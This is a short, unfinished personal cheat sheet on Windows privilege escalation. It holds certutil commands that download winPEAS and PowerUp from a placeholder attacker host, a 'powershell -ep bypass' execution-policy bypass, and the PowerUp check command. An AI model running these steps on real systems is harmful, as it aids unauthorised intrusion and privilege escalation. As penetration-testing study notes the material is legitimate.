# Common PrivEsc Methods

Here are some things I do for windows privesc.

## Identifying Privesc Vector

First, (after some basic one-liners) I like installing a `PowerUP` *AND* `winPEAS`. Using these tools will help us find the attack vector `80%` of the time.

### One-Liners

These one-liners will catch a good amount of privesc vectors:

- `whoami /priv` == See your users privs.
- 

### winPEAS

winPEAS is great to find some loot and privesc. Make sure to read fine print.

```cmd
certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
```

### PowerUP

PowerUp has some awesome utility. Check their official documentation for more info. To run all checks do the following:

```cmd
$ certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1
$ powershell -ep bypass
$ .\PowerUp.ps1; Invoke-AllChecks
```

## Obtaining Root
